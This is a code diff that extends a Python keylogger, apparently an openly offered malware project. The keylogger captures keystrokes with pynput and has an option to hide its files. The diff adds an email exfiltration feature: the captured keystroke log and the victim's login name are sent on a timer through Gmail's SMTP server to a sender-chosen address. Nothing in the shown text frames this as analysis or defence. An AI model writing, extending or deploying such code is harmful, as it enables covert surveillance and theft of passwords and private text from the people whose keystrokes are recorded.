@@ -3,6 +3,8 @@ from threading import Timer
 from pynput.keyboard import Listener, Key
 from platform import system
 import os
+import smtplib, ssl
+from email.message import EmailMessage
 
 class Keylogger:
     def __init__(
@@ -10,7 +12,10 @@ class Keylogger:
         interval : int = 60,
         reportMethod : str = "file",
         onlyOneFile : bool = False,
-        hiddenPath : bool = False
+        hiddenPath : bool = False,
+        emailSender : str = "",
+        passwordSender : str = "",
+        emailRecevier : str = ""
     ):
         self.interval = interval
         self.reportMethod = reportMethod
@@ -20,6 +25,12 @@ class Keylogger:
         self.endDatetime = datetime.now()
         self._updateFilename()
         self.hiddenPath = hiddenPath
+        self.emailSender = emailSender
+        self.passwordSender = passwordSender
+        if not emailRecevier:
+            self.emailRecevier = self.emailSender
+        else:
+            self.emailRecevier = emailRecevier 
 
         if hiddenPath:
             self.newPath = self._getNewPath()
@@ -73,6 +84,11 @@ class Keylogger:
 
             if self.reportMethod == "file":
                 self._reportToFile()
+            elif self.reportMethod == "email":
+                if self.emailSender and self.passwordSender:
+                    self._reportToEmail()
+                else:
+                    print("Email credentials wrong... Log losts...")
             print(f"[{self.fileName}] - {self.log}")
             self.startDatetime = datetime.now()
         
@@ -98,6 +114,25 @@ class Keylogger:
             print(self.log, file=f)
         print(f"[+] Saved {self.fileName}.tmp")
 
+    def _reportToEmail(self) -> None:
+        port = 465  # For SSL
+        smtp_server = "smtp.gmail.com"
+        sender_email = self.emailSender  # Enter your address
+        receiver_email = self.emailRecevier  # Enter receiver address
+        password = self.passwordSender
+
+        msg = EmailMessage()
+        msg.set_content(self.log)
+        msg['Subject'] = f"{self.fileName} {os.getlogin()} keylogger"
+        msg['From'] = sender_email
+        msg['To'] = receiver_email
+
+        context = ssl.create_default_context()
+        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
+            server.login(sender_email, password)
+            server.send_message(msg, from_addr=sender_email, to_addrs=receiver_email)
+            print(f"[+] Sended {self.fileName}")
+
     def _updateFilename(self) -> None:
         """
             Construct the filename to be identified by start & end datetimes
@@ -108,7 +143,5 @@ class Keylogger:
 
 if __name__ == "__main__":
     Keylogger(
-        interval=10,
-        onlyOneFile=True,
-        hiddenPath=True
+        interval=5
     ).start()
